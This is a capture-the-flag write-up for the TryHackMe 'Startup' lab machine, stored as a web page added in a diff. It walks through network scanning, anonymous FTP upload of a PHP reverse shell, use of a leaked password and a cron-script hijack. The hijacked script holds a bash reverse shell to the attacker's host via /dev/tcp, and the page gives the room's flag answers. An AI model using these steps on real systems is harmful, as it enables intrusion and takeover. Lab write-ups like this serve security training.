@@ -1,0 +1,482 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Startup | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Startup TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/startup/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/startup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Startup"><meta property="og:description" content="Startup TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/startup/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Startup"><meta name=twitter:description content="Startup TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Startup","item":"https://s4ch.github.io/writeups/tryhackme/startup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Startup","name":"Startup","description":"Startup TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Abuse traditional vulnerabilities via untraditional means.\nStartup\n💢 We will cover the topics Network Enumeration Web Enumeration FTP Enumeration FTP Exploitation Network Forensic Crontab Manipulation Task 1 Welcome to Spice Hut! We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren’t sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 kali@kali:~/CTFs/tryhackme/Startup$ sudo nmap -A -sS -sC -sV -O 10.10.36.184 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 13:27 CET Nmap scan report for 10.10.36.184 Host is up (0.032s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.8.106.222 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA) | 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA) |_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=11/13%OT=21%CT=1%CU=37615%PV=Y%DS=2%DC=T%G=Y%TM=5FAE7B OS:C3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 30.28 ms 10.8.0.1 2 37.46 ms 10.10.36.184 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kali@kali:~/CTFs/tryhackme/Startup$ gobuster dir -u http://10.10.36.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.36.184/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/11/13 13:34:12 Starting gobuster =============================================================== /files (Status: 301) Progress: 20964 / 220561 (9.50%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/11/13 13:35:22 Finished =============================================================== http://10.10.36.184/files/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184 Connected to 10.10.36.184. 220 (vsFTPd 3.0.3) Name (10.10.36.184:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rw-r--r-- 1 0 0 5 Nov 12 04:53 .test.log drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt 226 Directory send OK. ftp\u003e mget * mget ftp? 200 PORT command successful. Consider using PASV. 550 Failed to open file. mget important.jpg? 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for important.jpg (251631 bytes). 226 Transfer complete. 251631 bytes received in 0.59 secs (417.2951 kB/s) mget notice.txt? 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for notice.txt (208 bytes). 226 Transfer complete. 208 bytes received in 0.00 secs (140.4737 kB/s) ftp\u003e cd ftp 250 Directory successfully changed. ftp\u003e ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. 226 Directory send OK. ftp\u003e but Maya is looking pretty sus.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184 Connected to 10.10.36.184. 220 (vsFTPd 3.0.3) Name (10.10.36.184:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e put php-reverse-shell.php local: php-reverse-shell.php remote: php-reverse-shell.php 200 PORT command successful. Consider using PASV. 553 Could not create file. ftp\u003e ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rw-r--r-- 1 0 0 5 Nov 12 04:53 .test.log drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt 226 Directory send OK. ftp\u003e cd ftp 250 Directory successfully changed. ftp\u003e put php-reverse-shell.php local: php-reverse-shell.php remote: php-reverse-shell.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 5494 bytes sent in 0.00 secs (67.1729 MB/s) ftp\u003e exit 221 Goodbye. 1 2 www-data@startup:/$ cat recipe.txt Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love. 1 2 3 4 5 6 7 8 9 $ scp suspicious.pcapng kali@10.8.106.222:/home/kali/CTFs/tryhackme/Startup Could not create directory '/var/www/.ssh'. The authenticity of host '10.8.106.222 (10.8.106.222)' can't be established. ECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts). kali@10.8.106.222's password: suspicious.pcapng 100% 30KB 30.5KB/s 00:00 www-data@startup:/incidents$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 www-data@startup:/$ cd cd bash: cd: HOME not set www-data@startup:/$ ls ls bin etc\tinitrd.img.old media recipe.txt snap usr\tvmlinuz.old boot home\tlib\tmnt\troot\tsrv vagrant data incidents lib64\topt\trun\tsys var dev initrd.img lost+found\tproc\tsbin\ttmp vmlinuz www-data@startup:/$ cd home cd home www-data@startup:/home$ cd lennie cd lennie bash: cd: lennie: Permission denied www-data@startup:/home$ ls ls lennie www-data@startup:/home$ cd lennie cd lennie bash: cd: lennie: Permission denied www-data@startup:/home$ sudo -l sudo -l [sudo] password for www-data: c4ntg3t3n0ughsp1c3 Sorry, try again. [sudo] password for www-data: Sorry, try again. [sudo] password for www-data: c4ntg3t3n0ughsp1c3 sudo: 3 incorrect password attempts www-data@startup:/home$ cat /etc/passwd 1 2 3 4 5 6 7 lennie@startup:~$ ls -lA total 12 drwxr-xr-x 2 lennie lennie 4096 Nov 12 04:53 Documents drwxr-xr-x 2 root root 4096 Nov 12 04:54 scripts -rw-r--r-- 1 lennie lennie 38 Nov 12 04:53 user.txt lennie@startup:~$ cat user.txt THM{03ce3d619b80ccbfb3b7fc81e46c0e79} 1 2 3 4 5 6 7 8 9 10 11 12 13 lennie@startup:~$ ls -lA scripts/ total 8 -rwxr-xr-x 1 root root 77 Nov 12 04:53 planner.sh -rw-r--r-- 1 root root 1 Nov 13 12:55 startup_list.txt lennie@startup:~$ cat scripts/startup_list.txt lennie@startup:~$ cat scripts/planner.sh #!/bin/bash echo $LIST \u003e /home/lennie/scripts/startup_list.txt /etc/print.sh lennie@startup:~$ echo $LIST lennie@startup:~$ 1 2 #!/bin/bash /bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.8.106.222/9002 0\u003e\u00261' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kali@kali:~/CTFs/tryhackme/Startup$ nc -lnvp 9002 Listening on 0.0.0.0 9002 Connection received on 10.10.36.184 36364 bash: cannot set terminal process group (1690): Inappropriate ioctl for device bash: no job control in this shell root@startup:~# ls -lA ls -lA total 20 -rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc drwxr-xr-x 2 root root 4096 Nov 12 04:54 .nano -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 38 Nov 12 04:53 root.txt drwx------ 2 root root 4096 Nov 12 04:50 .ssh root@startup:~# cat root.txt cat root.txt THM{f963aaa6a430f210222158ae15c3d76d} What is the secret spicy soup recipe?\nlove\nWhat are the contents of user.txt?\nTHM{03ce3d619b80ccbfb3b7fc81e46c0e79}\nWhat are the contents of root.txt?\nTHM{f963aaa6a430f210222158ae15c3d76d}\nTask 2 Credits Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work!\nI’d like to thank my coffee as this took me hours to make, being that it is the first time I have done something like this.\nI’d like to thank ku5e for being a good sensei and GeneralClaw, my grammar cop.\nI’d like to thank my testers Amit25095, Krypt0c, BarZigmon and powershot.\nAdditionally, I’d love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community.\nAnd of course, I’d like to thank you for playing. Hope to see you soon!\nCongratulations!\nNo answer needed\n","wordCount":"1573","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/startup/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Startup</h1><div class=post-description>Startup TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1573 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-welcome-to-spice-hut>Task 1 Welcome to Spice Hut!</a></li><li><a href=#task-2-credits>Task 2 Credits</a></li></ul></nav></div></details></div><div class=post-content><p>Abuse traditional vulnerabilities via untraditional means.</p><p><a href=https://tryhackme.com/room/startup>Startup</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Enumeration</li><li>FTP Enumeration</li><li>FTP Exploitation</li><li>Network Forensic</li><li>Crontab Manipulation</li></ul><hr><h2 id=task-1-welcome-to-spice-hut>Task 1 Welcome to Spice Hut!<a hidden class=anchor aria-hidden=true href=#task-1-welcome-to-spice-hut>#</a></h2><p>We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren&rsquo;t sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Startup$ sudo nmap -A -sS -sC -sV -O 10.10.36.184
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 13:27 CET
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.36.184
+</span></span><span class=line><span class=cl>Host is up (0.032s latency).
+</span></span><span class=line><span class=cl>Not shown: 997 closed ports
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class=line><span class=cl>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class=line><span class=cl>| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
+</span></span><span class=line><span class=cl>| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+</span></span><span class=line><span class=cl>|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+</span></span><span class=line><span class=cl>| ftp-syst:
+</span></span><span class=line><span class=cl>|   STAT:
+</span></span><span class=line><span class=cl>| FTP server status:
+</span></span><span class=line><span class=cl>|      Connected to 10.8.106.222
+</span></span><span class=line><span class=cl>|      Logged in as ftp
+</span></span><span class=line><span class=cl>|      TYPE: ASCII
+</span></span><span class=line><span class=cl>|      No session bandwidth limit
+</span></span><span class=line><span class=cl>|      Session timeout in seconds is 300
+</span></span><span class=line><span class=cl>|      Control connection is plain text
+</span></span><span class=line><span class=cl>|      Data connections will be plain text
+</span></span><span class=line><span class=cl>|      At session startup, client count was 1
+</span></span><span class=line><span class=cl>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class=line><span class=cl>|_End of status
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+</span></span><span class=line><span class=cl>|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: Maintenance
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=11/13%OT=21%CT=1%CU=37615%PV=Y%DS=2%DC=T%G=Y%TM=5FAE7B
+</span></span><span class=line><span class=cl>OS:C3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
+</span></span><span class=line><span class=cl>OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
+</span></span><span class=line><span class=cl>OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+</span></span><span class=line><span class=cl>OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+</span></span><span class=line><span class=cl>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+</span></span><span class=line><span class=cl>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+</span></span><span class=line><span class=cl>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+</span></span><span class=line><span class=cl>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+</span></span><span class=line><span class=cl>OS:D=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 443/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   30.28 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   37.46 ms 10.10.36.184
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Startup$ gobuster dir -u http://10.10.36.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.36.184/
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/11/13 13:34:12 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/files (Status: 301)
+</span></span><span class=line><span class=cl>Progress: 20964 / 220561 (9.50%)^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/11/13 13:35:22 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.36.184/files/>http://10.10.36.184/files/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
